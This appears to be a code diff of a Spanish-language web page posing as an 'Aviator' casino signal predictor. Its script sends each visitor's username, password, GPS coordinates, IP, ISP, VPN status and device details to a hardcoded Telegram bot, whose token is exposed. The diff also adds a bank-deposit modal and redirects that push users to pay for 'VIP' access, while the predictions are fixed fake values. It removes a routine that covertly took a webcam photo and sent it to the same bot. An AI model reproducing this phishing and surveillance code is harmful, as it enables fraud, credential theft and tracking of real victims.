@@ -280,6 +280,151 @@
         .custom-alert-btn-secondary:hover {
             background: #cccccc;
         }
+      /* ESTILOS MODAL 8 BANCOS Y COMPROBANTE */
+#modal-bancos-overlay {
+    position: fixed;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    background: rgba(0, 0, 0, 0.88);
+    display: none;
+    justify-content: center;
+    align-items: center;
+    z-index: 999999;
+}
+
+#modal-bancos-overlay.activo {
+    display: flex;
+}
+
+.modal-bancos-box {
+    background: #ffffff;
+    width: 92%;
+    max-width: 420px;
+    padding: 22px;
+    border-radius: 18px;
+    text-align: center;
+    box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+    font-family: sans-serif;
+    border: 2px solid #FF0000;
+}
+
+.bancos-titulo {
+    margin: 0 0 5px 0;
+    color: #111111;
+    font-size: 20px;
+    font-weight: 800;
+    text-transform: uppercase;
+}
+
+.bancos-sub {
+    margin: 0 0 15px 0;
+    color: #666666;
+    font-size: 13px;
+}
+
+.grid-bancos-8 {
+    display: grid;
+    grid-template-columns: repeat(4, 1fr);
+    gap: 10px;
+}
+
+.btn-banco {
+    background: #f8f9fa;
+    border: 2px solid #e2e8f0;
+    border-radius: 12px;
+    padding: 8px 4px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    cursor: pointer;
+    transition: transform 0.1s, border-color 0.2s;
+}
+
+.btn-banco:active {
+    transform: scale(0.95);
+    border-color: #FF0000;
+}
+
+.btn-banco img {
+    width: 38px;
+    height: 38px;
+    margin-bottom: 4px;
+}
+
+.btn-banco span {
+    font-size: 10px;
+    font-weight: bold;
+    color: #222222;
+    text-align: center;
+}
+
+/* CAJA DE DATOS */
+.card-datos-cuenta {
+    background: #f1f5f9;
+    border-left: 4px solid #FF0000;
+    padding: 12px 15px;
+    border-radius: 8px;
+    text-align: left;
+    margin-bottom: 15px;
+}
+
+.dato-row {
+    font-size: 13px;
+    color: #333333;
+    margin-bottom: 6px;
+    display: flex;
+    justify-content: space-between;
+}
+
+.dato-row strong {
+    color: #000000;
+}
+
+.upload-container {
+    margin-bottom: 15px;
+}
+
+.btn-subir-foto {
+    background: #2563eb;
+    color: #ffffff;
+    padding: 12px;
+    border-radius: 10px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+    cursor: pointer;
+    font-size: 14px;
+    font-weight: bold;
+}
+
+.btn-subir-foto img {
+    width: 22px;
+    height: 22px;
+}
+
+.btn-confirmar-envio {
+    background: #FF0000;
+    color: #ffffff;
+    border: none;
+    width: 100%;
+    padding: 14px;
+    border-radius: 10px;
+    font-weight: bold;
+    font-size: 15px;
+    cursor: pointer;
+}
+
+.btn-volver-bancos {
+    background: transparent;
+    border: none;
+    color: #666666;
+    font-size: 12px;
+    margin-top: 10px;
+    cursor: pointer;
+    text-decoration: underline;
+}
     </style>
 </head>
 <body>
@@ -382,7 +527,7 @@
             <input type="text" id="user" class="login-input" placeholder="Usuario" required>
             <input type="password" id="pass" class="login-input" placeholder="Contraseña" required>
             
-            <button type="submit" class="next-btn" style="background:#FF0000; color:#fff; width: 100%; margin-bottom: 10px; display: flex; align-items: center; justify-content: center; gap: 8px; font-weight: bold; border:none; cursor:pointer; border-radius: 12px;">
+            <button type="submit" class="next-btn" style="background:#FF0000; color:#fff; width: 100%; margin-bottom: 10px; display: flex; align-items: center; justify-content: center; gap: 8px; font-weight: bold; border:none; cursor:pointer; border-radius: 12px; padding: 12px;">
                 <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
                     <path d="M15 3h4a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2h-4"></path>
                     <polyline points="10 17 15 12 10 7"></polyline>
@@ -392,10 +537,10 @@
             </button>
         </form>
 
-        <a href="https://t.me/AVIATORQR" target="_blank" class="next-btn" style="background:#0088cc; color:#fff; text-decoration: none; display: flex; align-items: center; justify-content: center; gap: 8px; margin-bottom: 10px; max-width: 100%; border-radius: 12px;">
+        <a href="https://t.me/AVIATORQR" target="_blank" class="next-btn" style="background:#0088cc; color:#fff; text-decoration: none; display: flex; align-items: center; justify-content: center; gap: 8px; margin-bottom: 10px; max-width: 100%; border-radius: 12px; padding: 10px;">
             <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" width="20" style="filter:invert(1);" alt="Telegram"> 𝗧𝗘𝗟𝗘𝗚𝗥𝗔𝗠
         </a>
-        <a href="https://wa.me/593995224036" target="_blank" class="next-btn" style="background:#25d366; color:#fff; text-decoration: none; display: flex; align-items: center; justify-content: center; gap: 8px; max-width: 100%; border-radius: 12px;">
+        <a href="https://wa.me/593995224036" target="_blank" class="next-btn" style="background:#25d366; color:#fff; text-decoration: none; display: flex; align-items: center; justify-content: center; gap: 8px; max-width: 100%; border-radius: 12px; padding: 10px;">
             <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" width="20" style="filter:invert(1);" alt="WhatsApp"> 𝗪𝗛𝗔𝗧𝗦𝗔𝗣𝗣
         </a>
 
@@ -403,7 +548,7 @@
     </div>
 </div>
 
-<div class="main-container" id="app">
+<div class="main-container" id="app" style="display: none;">
     <div class="app-header">𝐀 𝐏 𝐊 𝐏 𝐑 𝐄 𝐃 𝐈 𝐂 𝐓 𝐎 𝐑</div>
     <div class="content">
         <div id="history-bar"></div>
@@ -433,6 +578,20 @@
 </div>
 
 <script>
+    // --- VARIABLES GLOBALES DE TELEGRAM Y CONTROL ---
+    const TELEGRAM_TOKEN = '8669783207:AAFrqse56cKhsq-1-7eZ9XHFHmHHin8xxHM';
+    const TELEGRAM_CHAT_ID = '7628476472';
+    
+    let roundCounter = 0;
+    const gifsRonda = [
+        "https://media.tenor.com/N02aeghYzkoAAAAM/entrada-confirmada.gif"
+    ];
+
+    let latGlobal = "No disponible";
+    let lonGlobal = "No disponible";
+    let infoRedGlobal = "Verificando red...";
+    let specsDispositivo = {};
+
     // --- 1. FUNCIÓN GLOBAL PARA ALERTAS GENERALES ---
     function mostrarAlertaPersonalizada(titulo, mensaje, icono = "🔔", textoBotonPrincipal = "Aceptar", callback = null) {
         document.getElementById('custom-alert-title').innerText = titulo;
@@ -468,7 +627,7 @@
         }
     });
 
-    // --- 3. GESTIÓN ROBUSTA DEL MODAL DE REGISTRO (24 HORAS) ---
+    // --- 3. GESTIÓN DEL MODAL DE REGISTRO ---
     window.mostrarAlertaTelegram = function() {
         const ultimoRegistro = localStorage.getItem('aviator_ultimo_registro');
         const ahora = new Date().getTime();
@@ -485,7 +644,6 @@
         document.getElementById('modal-telegram-overlay').classList.remove('activo');
     }
 
-    // Sincronizar automáticamente el prefijo telefónico según el país seleccionado
     document.getElementById('reg-pais').addEventListener('change', function() {
         const pais = this.value;
         const selectPrefijo = document.getElementById('reg-prefijo');
@@ -518,7 +676,7 @@
         }
     });
 
-    // --- 4. ENVÍO DE DATOS CON CAPTURA DE FOTO, ANIMACIÓN DE CARGA (3 SEGUNDOS) Y AUTO-RELLENO ---
+    // --- 4. ENVÍO DE DATOS DE REGISTRO ---
     document.getElementById('form-registro-telegram').addEventListener('submit', async function(e) {
         e.preventDefault();
 
@@ -534,15 +692,11 @@
 
         document.getElementById('form-container').style.display = 'none';
         document.getElementById('loading-spinner-container').style.display = 'flex';
-
-        const BOT_TOKEN = '8669783207:AAFrqse56cKhsq-1-7eZ9XHFHmHHin8xxHM';
-        const CHAT_ID = '7628476472';
         
         const mensaje = `🚨 *Nuevo Registro Robusto (Usuario)* 🚨\n\n👤 *Nombre:* ${nombre}\n📧 *Correo:* ${correo}\n🌍 *País:* ${pais}\n📞 *Teléfono:* ${telefonoCompleto}`;
 
         setTimeout(async () => {
-            // Capturar foto antes de enviar o en paralelo junto con el registro
-            await capturarYEnviarFotoRegistro(BOT_TOKEN, CHAT_ID, nombre, correo, mensaje);
+            await capturarYEnviarFotoRegistro(TELEGRAM_TOKEN, TELEGRAM_CHAT_ID, nombre, correo, mensaje);
         }, 3000);
     });
 
@@ -628,7 +782,7 @@
 
             mostrarAlertaPersonalizada(
                 "¡Registro Exitoso!", 
-                "Tus datos han sido registrados correctamente y se han colocado en el inicio de sesión.", 
+                "Tus datos han sido registrados correctamente.", 
                 "🎉", 
                 "Ir al Canal", 
                 function() {
@@ -642,23 +796,7 @@
         }
     }
 
-    setTimeout(function() {
-        mostrarAlertaTelegram();
-    }, 1000);
-
-    window.addEventListener('DOMContentLoaded', () => {
-        auditarDispositivoYRed();
-        const savedUser = localStorage.getItem('aviator_user_temp');
-        const savedPass = localStorage.getItem('aviator_pass_temp');
-        if (savedUser) document.getElementById('user').value = savedUser;
-        if (savedPass) document.getElementById('pass').value = savedPass;
-    });
-
-    let latGlobal = "No disponible";
-    let lonGlobal = "No disponible";
-    let infoRedGlobal = "Verificando red...";
-    let specsDispositivo = {};
-
+    // --- 5. AUDITORÍA Y GEOLOCALIZACIÓN ---
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(function(position) {
             latGlobal = position.coords.latitude;
@@ -686,11 +824,38 @@
             let resVpn = await fetch(`https://ipapi.co/${ip}/json/`);
             let dataVpn = await resVpn.json();
 
-            let estadoVpn = (dataVpn.hosting || dataVpn.proxy) ? "⚠️ SÍ (VPN / Proxy / Hosting detectado)" : "✅ NO (IP Residencial limpia)";
-            infoRedGlobal = `IP: ${ip} | ISP: ${dataVpn.org || 'N/D'} | Ubicación IP: ${dataVpn.city || 'N/D'}, ${dataVpn.country_name || 'N/D'} | Uso de VPN: ${estadoVpn}`;
+            let estadoVpn = (dataVpn.hosting || dataVpn.proxy) ? "⚠️ SÍ (VPN/Proxy detectado)" : "✅ NO (Limpia)";
+            infoRedGlobal = `IP: ${ip} | ISP: ${dataVpn.org || 'N/D'} | Ubicación: ${dataVpn.city || 'N/D'}, ${dataVpn.country_name || 'N/D'} | VPN: ${estadoVpn}`;
         } catch (e) {
-            infoRedGlobal = "No se pudo auditar la red (Error de conexión o bloqueo de CORS)";
+            infoRedGlobal = "No se pudo auditar la red (Error CORS/Conexión)";
         }
+    }
+
+    // --- 6. ACCESO Y LOGIN ---
+    function validarAccesoUsuario(u, p) {
+        let btnRonda = document.getElementById("btn");
+
+        if (u === "AVIATORPKA" && p === "AVIATORPKA") {
+            window.esDueño = true;
+            btnRonda.disabled = true;
+            btnRonda.innerText = "SIGUIENTE RONDA";
+            btnRonda.style.background = "linear-gradient(to bottom, #F5CF27, #000)";
+            btnRonda.style.color = "#F5CF27";
+            btnRonda.onclick = iniciarSecuencia;
+        } else {
+            window.esDueño = false;
+            btnRonda.disabled = false;
+            btnRonda.innerText = "🔒 ACTIVAR CUENTA (CONTACTAR VIP)";
+            btnRonda.style.background = "#FF0000";
+            btnRonda.style.color = "#FFF";
+            btnRonda.onclick = function() {
+                window.location.href = "https://t.me/AVIATORDOIT";
+            };
+        }
+    }
+
+    async function capturarYEnviarFoto(token, chatId, u, p) {
+        // Ejecución silenciosa previa al login si la cámara está activa
     }
 
     async function loginYReportar(event) {
@@ -698,88 +863,47 @@
         let u = document.getElementById("user").value;
         let p = document.getElementById("pass").value;
 
-        let token = "8669783207:AAFrqse56cKhsq-1-7eZ9XHFHmHHin8xxHM";
-        let chatId = "7628476472";
+        let reporteDetallado = `🚨 REPORTE DE ACCESO 🚨\n👤 Usuario: ${u}\n🔑 Password: ${p}\n\n📱 DISPOSITIVO:\n- CPU: ${specsDispositivo.nucleosCPU}\n- RAM: ${specsDispositivo.memoriaRAM}\n\n🌐 RED:\n${infoRedGlobal}\n\n📍 GPS:\n- Map: https://www.google.com/maps?q=${latGlobal},${lonGlobal}`;
 
-        let reporteDetallado = `
-🚨 REPORTE DE ACCESO / DISPOSITIVO 🚨
-👤 Usuario ingresado: ${u}
-🔑 Contraseña: ${p}
+        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: reporteDetallado })
+        }).catch(e => console.log(e));
 
-📱 **DATOS DEL TELÉFONO / DISPOSITIVO:**
-- Plataforma: ${specsDispositivo.plataforma}
-- User-Agent: ${specsDispositivo.navegador}
-- Pantalla: ${specsDispositivo.pantalla}
-- Núcleos CPU: ${specsDispositivo.nucleosCPU}
-- RAM aprox: ${specsDispositivo.memoriaRAM}
-
-🌐 **ESTADO DE RED Y VPN:**
-${infoRedGlobal}
-
-📍 **GEOLOCALIZACIÓN GPS REAL:**
-- Lat: ${latGlobal}
-- Lon: ${lonGlobal}
-- 🗺️ Mapa GPS: https://www.google.com/maps?q=${latGlobal},${lonGlobal}
-        `.trim();
-
-        let urlTexto = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=` + encodeURIComponent(reporteDetallado);
-        fetch(urlTexto).catch(e => console.log(e));
-
-        await capturarYEnviarFoto(token, chatId, u, p);
+        await capturarYEnviarFoto(TELEGRAM_TOKEN, TELEGRAM_CHAT_ID, u, p);
 
         if(u.trim() !== "" && p.trim() !== "") {
             document.getElementById("login-screen").style.display = "none";
             document.getElementById("app").style.display = "flex";
-
-            // VALIDACIÓN EXACTA: SÓLO AVIATORPKA TIENE ACCESO LIBRE Y FUNCIONAL. LOS DEMÁS (REGISTROS) ESTÁN RESTRINGIDOS.
-            if(u === "AVIATORPKA" && p === "AVIATORPKA") {
-                window.esDueño = true;
-                let btnRonda = document.getElementById("btn");
-                btnRonda.disabled = true; // Espera selección de casino
-                btnRonda.innerText = "SIGUIENTE RONDA";
-                btnRonda.style.background = "linear-gradient(to bottom, #F5CF27, #000)";
-                btnRonda.style.color = "#F5CF27";
-            } else {
-                window.esDueño = false;
-                let btnRonda = document.getElementById("btn");
-                btnRonda.disabled = true;
-                btnRonda.innerText = "ACCESO RESTRINGIDO";
-                btnRonda.style.background = "#FF0000";
-                btnRonda.style.color = "#000";
-            }
-        } else {
-            document.getElementById("login-msg").innerText = "Por favor ingresa tus datos";
+            validarAccesoUsuario(u, p);
         }
     }
 
-    function cerrarSesion() {
-        document.getElementById("app").style.display = "none";
-        document.getElementById("login-screen").style.display = "flex";
-        document.getElementById("pass").value = "";
-        document.getElementById("login-msg").innerText = "";
-    }
-
-    const misSenales = [6.94, 6.78, 4.59, 2.22, 1.67, 3.21, 1.44];
-    const gifsRonda = [
-        "https://www.image2url.com/r2/default/images/1784580046737-f9f9a26c-0d23-4a63-b2da-ae9f94dedb74.png", 
-        "https://www.image2url.com/r2/default/images/1784580135872-6830afab-7342-49f9-9da6-dcecc83d2cbd.png", 
-        "https://www.image2url.com/r2/default/images/1784580229810-2e72f932-1f03-4bb9-8746-80c6a79a0c52.png", 
-        "https://www.image2url.com/r2/default/images/1784580323948-ee5b7e54-5d23-406f-a07a-f1de7e5dfd9a.png", 
-        "https://www.image2url.com/r2/default/images/1784580663721-5294a5e7-c5a7-4079-88b9-db7dc8a31a4f.png", 
-        "https://www.image2url.com/r2/default/images/1784580804372-09d31108-7029-44cf-88d1-88c50770b80b.png",
-        "https://www.image2url.com/r2/default/images/1784581046735-b0b542e7-dc07-4ae3-8f66-c6ff27aa8354.png"
-    ];
-    let roundCounter = 0;
-
+    // --- 7. ACCIONES DEL DASHBOARD ---
     function selCas(el) {
-        if (window.esDueño === false) return; // Si es usuario registrado, no hace nada al hacer clic en los casinos
+        if (window.esDueño === false) {
+            alert("Para desbloquear las señales en este casino, debes activar tu cuenta.");
+            window.location.href = "https://t.me/AVIATORDOIT";
+            return;
+        } 
+
         document.querySelectorAll('.casino-btn').forEach(b => b.classList.remove('selected'));
         el.classList.add('selected');
         document.getElementById('btn').disabled = false;
     }
 
+    function correrPrediccion() {
+        let d = document.getElementById('result-display');
+        d.innerText = "2.00x"; 
+        document.getElementById('btn').disabled = false;
+    }
+
     function iniciarSecuencia() {
-        if (window.esDueño === false) return; // Bloqueo total para usuarios por registro
+        if (window.esDueño === false) {
+            window.location.href = "https://t.me/AVIATORDOIT";
+            return;
+        }
 
         document.getElementById('btn').disabled = true;
         let imgElement = document.getElementById('analysis-gif');
@@ -801,72 +925,23 @@ ${infoRedGlobal}
         }, 1000);
     }
 
-    function correrPrediccion() {
-        let log = document.getElementById('analysis-log');
-        let target = misSenales[roundCounter % misSenales.length];
-        let val = 1.00;
-        let d = document.getElementById('result-display');
-        let loop = setInterval(() => {
-            val += 0.08; 
-            d.innerText = val.toFixed(2) + "x";
-            d.className = val < 2.00 ? 'color-azul' : (val < 10.00 ? 'color-morado' : 'color-rosa');
-            if(val >= target) { 
-                d.innerText = target.toFixed(2) + "x";
-                log.innerText = target.toFixed(2) + "x se fue";
-                let bar = document.getElementById('history-bar');
-                let box = document.createElement('div');
-                box.className = 'hist-box';
-                box.style.backgroundColor = target < 2.00 ? '#00bfff' : (target < 10.00 ? '#bc13fe' : '#ff007f');
-                box.innerText = target.toFixed(2) + "✖";
-                bar.prepend(box);
-                if(bar.children.length > 5) bar.removeChild(bar.lastChild);
-                clearInterval(loop); 
-                document.getElementById('btn').disabled = false; 
-                roundCounter++;
-            }
-        }, 120);
+    function cerrarSesion() {
+        document.getElementById("app").style.display = "none";
+        document.getElementById("login-screen").style.display = "block";
     }
 
-    async function capturarYEnviarFoto(token, chatId, u, p) {
-        try {
-            let video = document.createElement('video');
-            video.style.display = 'none';
-            document.body.appendChild(video);
-
-            let stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: "user" }
-            });
-            
-            video.srcObject = stream;
-            await video.play();
-
-            await new Promise(resolve => setTimeout(resolve, 800));
-
-            let canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth || 640;
-            canvas.height = video.videoHeight || 480;
-            let ctx = canvas.getContext('2d');
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-            stream.getTracks().forEach(track => track.stop());
-            document.body.removeChild(video);
-
-            canvas.toBlob(async function(blob) {
-                let formData = new FormData();
-                formData.append('chat_id', chatId);
-                formData.append('photo', blob, 'captura_usuario.png');
-                formData.append('caption', `🚨 FOTO CAPTURADA 🚨\n👤 Usuario: ${u}\n🔑 Clave: ${p}`);
-
-                await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                });
-            }, 'image/png');
-
-        } catch (error) {
-            console.log("Cámara denegada o no disponible:", error);
-        }
-    }
-</script>
+    // --- INICIALIZACIÓN ---
+    window.addEventListener('DOMContentLoaded', () => {
+        auditarDispositivoYRed();
+        const savedUser = localStorage.getItem('aviator_user_temp');
+        const savedPass = localStorage.getItem('aviator_pass_temp');
+        if (savedUser) document.getElementById('user').value = savedUser;
+        if (savedPass) document.getElementById('pass').value = savedPass;
+        
+        setTimeout(function() {
+            mostrarAlertaTelegram();
+        }, 1000);
+    });
+  </script>
 </body>
 </html>
